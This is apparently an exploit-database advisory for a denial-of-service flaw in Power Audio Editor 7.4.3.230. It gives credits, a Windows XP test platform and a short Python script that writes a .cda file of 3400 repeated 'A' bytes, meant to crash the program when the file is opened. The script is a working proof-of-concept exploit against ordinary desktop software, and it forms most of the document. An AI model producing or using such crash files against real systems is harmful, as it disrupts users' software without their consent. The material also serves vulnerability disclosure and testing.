#Title: Power Audio Editor (.cda) Denial of service vulnerability

#Author    :   anT!-Tr0J4n

#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~all DEV-PoinT t34m

#thanks    :   r0073r ; Sid3^effects ; L0rd CrusAd3r ; all Inj3ct0r 31337 Member

#Home     :   www.Dev-PoinT.com  $ http://inj3ct0r.com

#Software :  http://www.nctsoft.net

#Version   :  7.4.3.230

#Tested on:   Windows XP sp3

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


#!/usr/bin/python
outfile="X.cda"
junk="\x41" * 3400
FILE=open(outfile, "w")
FILE.write(junk)
FILE.close()
print "[+] File created succesufully , [+]"